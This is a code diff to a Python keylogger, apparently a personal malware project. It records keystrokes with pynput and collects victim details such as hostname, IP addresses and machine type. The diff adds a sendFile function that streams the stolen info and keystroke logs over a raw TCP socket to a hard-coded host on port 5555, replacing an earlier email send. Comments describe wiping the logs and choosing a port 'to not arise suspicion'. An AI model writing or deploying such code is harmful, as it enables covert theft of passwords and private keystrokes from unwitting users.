@@ -11,6 +11,8 @@ from typing import *;
 from requests import get;
 from pynput.keyboard import Listener, Key
 
+HOST: str = "10.0.0.19" # Hackuntu or Laptop for testing
+PORT: int = 5555  # Will use this port for now, but could change it later
 FILEPATH = ""
 KEYS: List[Key] = []
 COUNT: int = 0
@@ -20,7 +22,7 @@ def main():
     filepath: str = ""
     filepath = makePath()  # Create the path for the files to be stored
     FILEPATH = filepath
-    victimInfo(filepath)
+    victimInfo(filepath)  # Get the information of a victim and send it to me
 
     # Keylogger process runs
     with Listener(on_press=keyPress) as listener:
@@ -55,7 +57,7 @@ def writeKey(keys: List[Key], filepath: str) -> None:
                 keyFile.write("\n")
             if k.find("Key") == -1: # Check if it is a special key
                 keyFile.write(k)
-        fileSize = os.path.getsize(filepath) # Check the size of the file and when it gets to a certain size send email
+        fileSize = os.path.getsize(filepath) # Check the size of the file and when it gets to a certain size send file
         if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
             clear(filepath)
 
@@ -66,9 +68,9 @@ def victimInfo(filepath: str) -> None:
     """
     if (searchFile(filepath.replace("performance.txt", ""), "info.txt") is not None): # Check if we already got the info of this victim
         return;
-    filePath: str = filepath.replace("performance.txt", "info.txt")
+    newFilePath: str = filepath.replace("performance.txt", "info.txt")
 
-    with open(filePath, "w") as infoFile:
+    with open(newFilePath, "w") as infoFile:
         hostname: str = socket.gethostname()
         privateIP: str = socket.gethostbyname(hostname)
         try:
@@ -81,7 +83,8 @@ def victimInfo(filepath: str) -> None:
         infoFile.write("Machine: " + platform.machine() + "\n")
         infoFile.write("Hostname: " + hostname + "\n")
         infoFile.write("Private IP: " + privateIP)
-    sendEmail(filePath)
+    #sendEmail(filePath)
+    sendFile(HOST, PORT, newFilePath)
 
 def makePath() -> str:
     homepath: str = ""
@@ -181,12 +184,40 @@ def sendEmail(filePath: str) -> None:
         # Close the connection to the SMTP server
         server.quit()
 
+def sendFile(host: str, port: int, filepath: str) -> None:
+    """
+    This function will send a file to my computer using my IP
+    and using port 5555 which is one that is not used and can be
+    less suspicious
+    """
+    clientSocket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Start a socket object
+    # Trying to send the file
+    try:
+        clientSocket.connect((host, port))  # Connecting to the host and port
+        print(f"Connected to {host}:{port}")  # Debug print for now to ensure that it connected
+
+        # Send the file data to the computer
+        with open(filepath, 'rb') as file:
+            while True:
+                data = file.read(1024)
+                if not data:
+                    break
+                clientSocket.sendall(data)
+        print("File sent successfully!")  # Debug print for now to ensure that it sent
+    # Any exception that is caught will get print for debug purposes
+    except Exception as e:
+        print(f"Error occurred: {e}")
+    # At the end we will close the socket
+    finally:
+        clientSocket.close()
+
 def clear(filepath: str):
     """
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
     """
-    sendEmail(filepath)
+    #sendEmail(filepath)
+    sendFile(HOST, PORT, filepath)
     with open(filepath, "w") as keyFile:
         keyFile.truncate(0)
 
